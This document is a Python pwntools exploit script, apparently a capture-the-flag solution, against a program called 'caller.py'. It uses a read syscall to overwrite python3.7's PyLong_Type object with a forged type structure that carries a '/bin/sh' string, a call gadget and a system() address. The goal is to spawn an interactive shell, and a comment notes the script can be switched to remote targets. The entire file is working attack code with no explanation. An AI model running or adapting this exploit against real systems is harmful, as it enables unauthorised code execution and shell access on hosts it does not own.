import time
import pwn
PyLong_Type = [
        0x0000000000000043, 0x0000000000a26aa0,
        0x0000000000000000, 0x000000000076e835,
        0x0000000000000018, 0x0000000000000004,
        0x00000000005b0190, 0x0000000000000000,
        0x0000000000000000, 0x0000000000000000,
        0x0000000000000000, 0x00000000005c37e0,
        0x0000000000a22aa0, 0x0000000000000000,
        0x0000000000000000, 0x00000000005afe30,
        0x0000000000000000, 0x6666666666666666,
        0x00000000005a5700, 0x00000000005a7ab0,
        ]

PyLong_Type_address = 0xa25940
# system_address = 0x421080 # actual address of system in plt doesn't fit, crashes with SIGSEGV, so try another one
system_address = 0x44D27C # works!

corrupt_type = PyLong_Type[:]
corrupt_type[0] = pwn.u64(b'/bin/sh\0') # string to execute
corrupt_type[1] = PyLong_Type_address
corrupt_type[17] =  0x4afed6 # mov rdx, qword ptr [rax + 8]; mov rdi, rax; call qword ptr [rdx + 0x30];
corrupt_type[0x30 // 8] =  system_address # rcx + 0x30 to be called

payload = b''.join(pwn.p64(i) for i in corrupt_type)

p = pwn.process(["python3.7", "caller.py"]) # change to pwn.remote for remote exploitation
p.readuntil("[?] syscall number: ")
p.sendline("0") # read syscall
p.readuntil("[?] syscall arguments: ")
p.sendline(f"0 {PyLong_Type_address} {len(payload)}") # read len(payload) bytes from stdin into &PyLong_Type

time.sleep(5) # sleep in order to wait for read() syscall
p.send(payload)
p.interactive()

